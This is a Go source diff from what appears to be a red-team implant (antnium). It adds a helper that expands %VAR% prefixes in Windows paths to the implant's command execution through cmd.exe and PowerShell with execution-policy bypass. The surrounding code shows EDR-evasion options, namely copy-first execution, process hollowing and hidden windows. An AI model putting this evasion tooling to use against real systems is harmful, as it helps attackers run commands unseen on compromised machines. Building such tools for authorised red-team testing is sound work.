@@ -22,6 +22,8 @@ import (
 
 	"io/ioutil"
 
+	fp "path/filepath"
+
 	"github.com/dobin/antnium/pkg/inject"
 	"github.com/dobin/antnium/pkg/model"
 	log "github.com/sirupsen/logrus"
@@ -141,6 +143,7 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
 		}
+		commandStr = ResolveWinPath(commandStr)
 		executable = `C:\windows\system32\cmd.exe`
 		x := fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
 		args = []string{x}
@@ -150,12 +153,13 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
 		}
-
+		commandStr = ResolveWinPath(commandStr)
 		executable = `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`
 		args = []string{"-ExecutionPolicy", "Bypass", "-C", commandStr}
 
 	case "raw":
 		executable, args, err = model.MakePacketArgumentFrom(packetArgument)
+		executable = ResolveWinPath(executable)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
 		}
@@ -164,7 +168,8 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
 	}
 
-	// Always resolve full path, we may need it
+	// Always resolve executable full path, we may need it
+	executable = ResolveWinPath(executable)
 	if filepath.Base(executable) == executable {
 		if lp, err := exec.LookPath(executable); err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
@@ -176,6 +181,7 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 	/* Anti-EDR: copyFirst */
 	if spawnType == "copyFirst" {
 		destinationPath := spawnData
+		destinationPath = ResolveWinPath(destinationPath)
 		if destinationPath == "" {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
 		}
@@ -221,6 +227,7 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		if sourcePath == "" {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
 		}
+		sourcePath = ResolveWinPath(sourcePath)
 		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
 		}
@@ -263,6 +270,45 @@ func getSysProcAttrs() *syscall.SysProcAttr {
 	return &syscall.SysProcAttr{
 		HideWindow: true,
 	}
+}
+
+// from https://gitlab.com/stu0292/windowspathenv/-/blob/master/windowsPathEnv.go (No license)
+// Resolve first element of a filepath as environment variable if enclosed in %. Only the first path element is considered as an environment variable. Eg:
+// %GOPATH%/bin/gitlab.com/stu-b-doo/
+func ResolveWinPath(filepath string) (out string) {
+	// return the original filepath unchanged unless we get to the end
+	out = filepath
+
+	// return unless strings starts with %
+	if !strings.HasPrefix(filepath, "%") {
+		return
+	}
+
+	// return unless there's a second %
+	trim := strings.TrimPrefix(filepath, "%")
+	i := strings.Index(trim, "%")
+	if i == -1 {
+		return
+	}
+
+	varName := trim[:i]
+
+	// check if substr between two % is the name of an existing env var
+	val, ok := os.LookupEnv(varName)
+	if !ok {
+		return
+	}
+
+	// env var value will use os path separator
+	remainder := fp.FromSlash(trim[i+1:])
+
+	// check the remainder starts with path separateor
+	if !strings.HasPrefix(remainder, "\\") {
+		return
+	}
+
+	// prepend the value to the remainder of the path
+	return val + remainder
 }
 
 func CopyFile(src, dst string) error {
